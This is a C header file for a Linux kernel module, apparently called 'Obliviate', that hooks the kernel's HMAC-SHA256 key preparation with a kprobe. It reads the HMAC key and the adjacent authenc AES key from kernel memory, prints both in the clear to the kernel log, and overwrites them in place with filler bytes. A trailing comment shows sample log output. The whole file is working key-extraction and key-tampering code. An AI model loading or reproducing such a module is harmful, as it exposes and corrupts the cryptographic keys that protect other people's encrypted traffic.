#ifndef OBLIVIATE_COMPOSITE_HELPERS_H
#define OBLIVIATE_COMPOSITE_HELPERS_H

#include "headers/main_header.h"

#if (UNFORGIVABLE_KERNEL_CURSE)

static int composite_approach_prehandler(struct kprobe *kps, struct pt_regs *regs);

static struct kprobe kps = {
    .symbol_name = "__hmac_sha256_preparekey",
    .pre_handler = composite_approach_prehandler,
};

static int composite_approach_prehandler(struct kprobe *kps, struct pt_regs *regs){
    if(!kps || !regs)
        return 0;

    u8 *raw_key = NULL;
    size_t raw_key_len = 0;
    u8 key_buffer[O_MAX_SIZE] = {0};
    long ret = 0;
    kallsyms_lookup_name_t my_local_kallsyms_lookup_name = NULL;
    long (*my_copy_to_kernel_nofault)(void *, const void *, size_t);
    void *ptr_to_rtattr = NULL;
    u8 rtattr_header_buffer[HEADER_SIZE] = {0};
    struct rtattr *rta = NULL;
    struct crypto_authenc_key_param *param = NULL;
    unsigned int enckeylen;
    u8 *raw_aes_key = NULL;

    raw_key = (u8 *)regs_get_kernel_argument(regs, 2);
    raw_key_len = (size_t)regs_get_kernel_argument(regs, 3);
    my_local_kallsyms_lookup_name = READ_ONCE(my_kallsyms_lookup_name);

    if(IS_ERR_OR_NULL(raw_key) || IS_ERR_OR_NULL(my_local_kallsyms_lookup_name))
        return 0;

    if(raw_key_len == 0 || raw_key_len > O_MAX_SIZE)
        return 0;

    ret = copy_from_kernel_nofault(key_buffer, raw_key, raw_key_len);
    if(ret != 0)
        return 0;

    pr_info("Hmac key: %*ph \n", (int)raw_key_len, key_buffer);

    my_copy_to_kernel_nofault = (long (*)(void *, const void *, size_t))my_local_kallsyms_lookup_name("copy_to_kernel_nofault");
    if(!my_copy_to_kernel_nofault)
        return 0;

    memset(key_buffer, 'R', O_MAX_SIZE);

    pr_info("[Obliviate]: wand points to HMAC key memory and said obliviate!\n");
    ret = my_copy_to_kernel_nofault(raw_key, key_buffer, raw_key_len);
    if(ret != 0)
        return 0;

    ptr_to_rtattr = raw_key - HEADER_SIZE;
    if(unlikely(!ptr_to_rtattr))
        return 0;

    ret = copy_from_kernel_nofault(rtattr_header_buffer, ptr_to_rtattr, HEADER_SIZE);
    if(ret != 0 )
        return 0;

    rta = (struct rtattr *)rtattr_header_buffer;
    if(!rta)
        return 0;

    if(rta->rta_type != CRYPTO_AUTHENC_KEYA_PARAM)
        return 0;

    param = RTA_DATA(rta);
    if(IS_ERR_OR_NULL(param))
        return 0;

    enckeylen = be32_to_cpu(param->enckeylen);
    if(!enckeylen)
        return 0;

    raw_aes_key = raw_key + raw_key_len;
    if(unlikely(!raw_aes_key))
        return 0;

    ret = copy_from_kernel_nofault(key_buffer, raw_aes_key, enckeylen);
    if(ret != 0)
        return 0;

    pr_info("AES raw key: %*ph \n", (int)enckeylen, key_buffer);

    memset(key_buffer, 'P', enckeylen);

    pr_info("[Obliviate]: wand points to AES key memory and said obliviate!\n");
    ret = my_copy_to_kernel_nofault(raw_aes_key, key_buffer, enckeylen);
    if(ret != 0)
        return 0;

    memzero_explicit(key_buffer, O_MAX_SIZE);

    return 0;
}
NOKPROBE_SYMBOL(composite_approach_prehandler);

static inline int register_composite_approach(void){
    int ret = 0;

    ret = register_kprobe(&kps);
    if(!ret)
        WRITE_ONCE(probe_hooked, true);

    return ret;
}

static inline void unregister_composite_approach(void){
    if(READ_ONCE(probe_hooked))
        unregister_kprobe(&kps);
}

#endif

#endif

/*
*   [ 2511.727274] Hmac key: 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 
*   [ 2511.730544] [Obliviate]: wand points to HMAC key memory and said obliviate!
*   [ 2511.730731] AES raw key: 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 
*   [ 2511.730787] [Obliviate]: wand points to AES key memory and said obliviate!
*
*/